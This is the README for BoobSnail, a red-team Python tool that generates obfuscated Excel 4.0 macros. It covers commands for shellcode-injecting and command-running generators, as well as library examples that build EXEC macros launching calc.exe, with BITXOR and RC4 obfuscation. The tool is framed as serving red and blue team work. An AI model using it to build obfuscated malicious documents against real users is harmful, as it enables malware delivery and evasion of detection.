<p align="center">
  <img src="assets/boobsnail.png" width=300 height=300>
</p>

![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)

Follow us on [Twitter](https://twitter.com/stm_cyber)!

# BoobSnail
BoobSnail allows generating XLM (Excel 4.0) macro. Its purpose is to support the RedTeam and BlueTeam in XLM macro generation.
Features:
- various infection techniques;
- various obfuscation techniques;  
- translation of formulas into languages other than English;
- can be used as a library - you can easily write your own generator.
 
## Building and Running
Tested on: Python 3.8.7rc1
```
pip install -r requirements.txt
python boobsnail.py
___.                ___.     _________             .__.__
\_ |__   ____   ____\_ |__  /   _____/ ____ _____  |__|  |
 | __ \ /  _ \ /  _ \| __ \ \_____  \ /    \__  \ |  |  |
 | \_\ (  <_> |  <_> ) \_\ \/        \   |  \/ __ \|  |  |__
 |___  /\____/ \____/|___  /_______  /___|  (____  /__|____/
     \/                  \/        \/     \/     \/
     Author: @_mzer0 @stm_cyber
     (...)
```
## Generators usage

```
python boobsnail.py <generator> -h
```

To display available generators type:
```
python boobsnail.py
```

### Examples
Generate obfuscated macro that injects x64 or x86 shellcode:
```
python boobsnail.py Excel4NtDonutGenerator --inputx86 <PATH_TO_SHELLCODE> --inputx64 <PATH_TO_SHELLCODE> --out boobsnail.csv
```

Generate obfuscated macro that runs calc.exe:
```
python boobsnail.py Excel4ExecGenerator --cmd "powershell.exe -c calc.exe" --out boobsnail.csv
```
### Saving output in Excel
1. Dump output to CSV file.
2. Copy content of CSV file.
3. Run Excel and create a new worksheet.
4. Add new Excel 4.0 Macro (right-click on Sheet1 -> Insert -> MS Excel 4.0 Macro).
5. Paste the content in cell A1 or R1C1.
6. Click Data -> Text to Columns.
7. Click Next -> Set Semicolon as separator and click Finish.

## Library usage
BoobSnail shares the excel4lib library that allows creating your own Excel4 macro generator.
excel4lib contains few classes that could be used during writing generator:
- excel4lib.macro.Excel4Macro - allows to defining Excel4 formulas, values variables;
- excel4lib.macro.obfuscator.Excel4Obfuscator - allows to obfuscate created instructions in Excel4Macro;
- excel4lib.lang.Excel4Translator - allows translating formulas to another language.

The main idea of this library is to represent Excel4 formulas, variables, formulas arguments, and values as python objects.
Thanks to that you are able to change instructions attributes such as formulas or variables names, values, addresses, etc. in an easy way.
For example, let's create a simple macro that runs calc.exe
```python
from excel4lib.macro import *
# Create macro object
macro = Excel4Macro("test.csv")
# Add variable called cmd with value "calc.exe" to the worksheet
cmd = macro.variable("cmd", "calc.exe")
# Add EXEC formula with argument cmd
macro.formula("EXEC", cmd)
# Dump to CSV
print(macro.to_csv())
```
Result:
```
cmd="calc.exe";
=EXEC(cmd);
```
Now let's say that you want to obfuscate your macro. To do this you just need to import obfuscator and pass it to the Excel4Macro object:
```python
from excel4lib.macro import *
from excel4lib.macro.obfuscator import *
# Create macro object
macro = Excel4Macro("test.csv", obfuscator=Excel4Obfuscator())
# Add variable called cmd with value "calc.exe" to the worksheet
cmd = macro.variable("cmd", "calc.exe")
# Add EXEC formula with argument cmd
macro.formula("EXEC", cmd)
# Dump to CSV
print(macro.to_csv())
```
For now excel4lib shares two obfuscation classes:
- excel4lib.macro.obfuscator.Excel4Obfuscator uses Excel 4.0 functions such as BITXOR, SUM, etc to obfuscate your macro;
- excel4lib.macro.obfuscator.Excel4Rc4Obfuscator uses RC4 encryption to obfusacte formulas.

As you can see you can write your own obfuscator class and use it in Excel4Macro.

Sometimes you will need to translate your macro to another language for example your native language, in my case it's Polish. With excel4lib it's pretty easy.
You just need to import Excel4Translator class and call set_language
```python
from excel4lib.macro import *
from excel4lib.lang.excel4_translator import *
# Change language
Excel4Translator.set_language("pl_PL")
# Create macro object
macro = Excel4Macro("test.csv", obfuscator=Excel4Obfuscator())
# Add variable called cmd with value "calc.exe" to the worksheet
cmd = macro.variable("cmd", "calc.exe")
# Add EXEC formula with argument cmd
macro.formula("EXEC", cmd)
# Dump to CSV
print(macro.to_csv())
```
Result:
```
cmd="calc.exe";
=URUCHOM.PROGRAM(cmd);
```
For now, only the English and Polish language is supported. If you want to use another language you need to add translations in the excel4lib/lang/langs directory.

For sure, you will need to create a formula that takes another formula as an argument. You can do this by using Excel4Macro.argument function.
```python
from excel4lib.macro import *
macro = Excel4Macro("test.csv")
# Add variable called cmd with value "calc" to the worksheet
cmd_1 = macro.variable("cmd", "calc")
# Add cell containing .exe as value
cmd_2 = macro.value(".exe")
# Create CONCATENATE formula that CONCATENATEs cmd_1 and cmd_2
exec_arg = macro.argument("CONCATENATE", cmd_1, cmd_2)
# Pass CONCATENATE call as argument to EXEC formula
macro.formula("EXEC", exec_arg)
# Dump to CSV
print(macro.to_csv())
```
Result:
```
cmd="calc";
.exe;
=EXEC(CONCATENATE(cmd,R2C1));
```
As you can see ".exe" string was passed to CONCATENATE formula as R2C1. 
R2C1 is address of ".exe" value (ROW number 2 and COLUMN number 1).
excel4lib returns references to formulas, values as addresses. References to variables are returned as their names.
You probably noted that Excel4Macro class adds formulas, variables, values to the worksheet automaticly in order
in which these objects are created and that the start address is R1C1.
What if you want to place formulas in another column or row?
You can do this by calling Excel4Macro.set_cords function.
```python
from excel4lib.macro import *
macro = Excel4Macro("test.csv")
# Column 1
# Add variable called cmd with value "calc" to the worksheet
cmd_1 = macro.variable("cmd", "calc")
# Add cell containing .exe as value
cmd_2 = macro.value(".exe")
# Column 2
# Change cords to columns 2
macro.set_cords(2,1)
exec_arg = macro.argument("CONCATENATE", cmd_1, cmd_2)
# Pass CONCATENATE call as argument to EXEC formula
exec_call = macro.formula("EXEC", exec_arg)
# Column 1
# Back to column 1. Change cords to column 1 and row 3
macro.set_cords(1,3)
# GOTO EXEC call
macro.goto(exec_call)
# Dump to CSV
print(macro.to_csv())
```
Result:
```
cmd="calc";=EXEC(CONCATENATE(cmd,R2C1));
.exe;;
=GOTO(R1C2);;
```

## Author
[mzer0](https://twitter.com/_mzer0) from [stm_cyber](https://twitter.com/stm_cyber) team!

## Articles
[The first step in Excel 4.0 for Red Team](https://blog.stmcyber.com/excel-4-0-for-red-team/)

[BoobSnail - Excel 4.0 macro generator](https://blog.stmcyber.com/boobsnail-excel-4-0-macro-generator/)
